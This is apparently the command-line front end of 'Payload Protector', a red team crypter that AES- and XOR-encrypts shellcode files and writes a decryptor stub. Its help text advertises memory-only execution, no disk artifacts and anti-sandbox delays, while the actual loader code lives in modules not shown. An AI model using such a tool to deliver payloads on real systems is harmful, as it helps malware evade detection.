import argparse
import binascii
import secrets
import sys
import platform
from .encryptor import encrypt_payload
from .obfuscator import obfuscate_key
from .stub_generator import generate_decryptor
from .updater import PayloadProtectorUpdater
from .version import get_version_info, get_version


def print_banner():
    """Print the application banner."""
    banner = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                        Payload Protector {get_version()}                      ║
║                   Hybrid Encryption Tool for Red Team Operations              ║
║                                                                               ║
║  Platform: {platform.system():<10} | Architecture: {platform.machine():<10}   ║
║  Author: HellReys     | License: MIT       | Build: Cross-Platform            ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    """.strip()
    print(banner)


def main():
    parser = argparse.ArgumentParser(
        description="Payload Protector - Cross-platform hybrid encryption tool for Red Team operations",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic encryption with auto-generated keys
  payloadprotector --input payload.bin --output encrypted.bin

  # Encrypt with custom password
  payloadprotector --input payload.bin --output encrypted.bin --key "MyPassword"

  # Full custom encryption
  payloadprotector --input payload.bin --output encrypted.bin --key "MyPassword" --xor_key "1a2b3c4d5e6f7890"

  # Update operations
  payloadprotector --check-update    # Check for updates
  payloadprotector --update          # Install updates
  payloadprotector --force-update    # Force reinstall

  # Information
  payloadprotector --version         # Show version info

Platform Support:
  - Windows (PE execution via VirtualProtect)
  - Linux (ELF execution via mmap)
  - Cross-platform stub generation

Security Features:
  - AES-256-CBC encryption with secure key generation
  - XOR obfuscation layer with ephemeral keys
  - Memory-only payload execution (no disk artifacts)
  - Anti-sandbox techniques
        """
    )

    # Main functionality arguments
    parser.add_argument("--input", "-i",
                        help="Input payload file (e.g., payload.bin, shellcode.bin)")
    parser.add_argument("--output", "-o",
                        help="Output encrypted file name")
    parser.add_argument("--key", "-k",
                        help="AES key (32-byte hex, password, or auto-generated if omitted)")
    parser.add_argument("--xor_key", "-x",
                        help="Custom XOR key (32-byte hex string)")

    # Update system arguments
    parser.add_argument("--update", action="store_true",
                        help="Update to the latest version")
    parser.add_argument("--check-update", action="store_true",
                        help="Check for available updates without installing")
    parser.add_argument("--force-update", action="store_true",
                        help="Force update even if no new version is detected")

    # Information arguments
    parser.add_argument("--version", "-v", action="store_true",
                        help="Show detailed version information")
    parser.add_argument("--quiet", "-q", action="store_true",
                        help="Suppress banner and minimize output")

    args = parser.parse_args()

    # Show banner unless quiet mode
    if not args.quiet:
        print_banner()

    # Handle version display
    if args.version:
        print(get_version_info())
        print(f"\nPlatform Details:")
        print(f"  System: {platform.system()}")
        print(f"  Release: {platform.release()}")
        print(f"  Architecture: {platform.machine()}")
        print(f"  Python: {platform.python_version()}")
        return

    # Handle update operations
    if args.update or args.check_update or args.force_update:
        try:
            updater = PayloadProtectorUpdater()

            if args.check_update:
                updater.check_only()
            elif args.update or args.force_update:
                success = updater.update(force=args.force_update)
                if not success:
                    print("[!] Update failed. Please check the error messages above.")
                    sys.exit(1)
                else:
                    print("[+] Update completed successfully!")
                    print("[*] Please restart your terminal to use the updated version.")
        except Exception as e:
            print(f"[!] Update system error: {e}")
            sys.exit(1)
        return

    # Validate required arguments for encryption
    if not args.input or not args.output:
        parser.error("--input and --output are required for encryption operations")

    # Check if input file exists
    import os
    if not os.path.exists(args.input):
        print(f"[!] Input file not found: {args.input}")
        sys.exit(1)

    try:
        if not args.quiet:
            print(f"\n[*] Starting encryption process...")
            print(f"[*] Input file: {args.input}")
            print(f"[*] Output file: {args.output}")
            print(f"[*] Platform: {platform.system()}")

        # 1. Encryption (All logic in encryptor.py)
        if not args.quiet:
            print(f"[*] Encrypting payload with AES-256-CBC...")

        result = encrypt_payload(args.input, args.output, args.key)

        if not args.quiet:
            print(f"[+] Encryption completed successfully")
            print(f"[+] AES Key (hex): {result['aes_key_hex']}")
            print(f"[+] IV (hex): {result['iv_hex']}")

        # 2. Obfuscation
        if not args.quiet:
            print(f"[*] Applying XOR obfuscation layer...")

        xor_key = binascii.unhexlify(args.xor_key) if args.xor_key else secrets.token_bytes(32)
        obfuscated, xor_key_hex = obfuscate_key(binascii.unhexlify(result['aes_key_hex']), xor_key)

        # 3. Generate Cross-platform Decryptor
        if not args.quiet:
            print(f"[*] Generating cross-platform decryptor stub...")

        decryptor_success = generate_decryptor(args.output, obfuscated.hex(), xor_key_hex)

        if decryptor_success:
            if not args.quiet:
                print(f"[+] XOR Key (hex): {xor_key_hex}")
                print(f"[+] Cross-platform decryptor generated: decryptor.py")
                print(f"\n[*] Execution Instructions:")
                print(f"    Windows: python decryptor.py")
                print(f"    Linux:   python3 decryptor.py  (or ./decryptor.py)")
                print(f"\n[*] Security Features Enabled:")
                print(f"    ✓ AES-256-CBC encryption")
                print(f"    ✓ XOR obfuscation layer")
                print(f"    ✓ Memory-only execution")
                print(f"    ✓ Anti-sandbox delays")
                print(f"    ✓ Cross-platform compatibility")
                print(f"\n[+] Payload protection completed successfully!")
        else:
            print(f"[!] Failed to generate decryptor stub")
            sys.exit(1)

    except FileNotFoundError as e:
        print(f"[!] File not found: {e}")
        sys.exit(1)
    except PermissionError as e:
        print(f"[!] Permission denied: {e}")
        print(f"[*] Make sure you have write permissions to the output directory")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        if not args.quiet:
            import traceback
            print(f"[*] Full error details:")
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()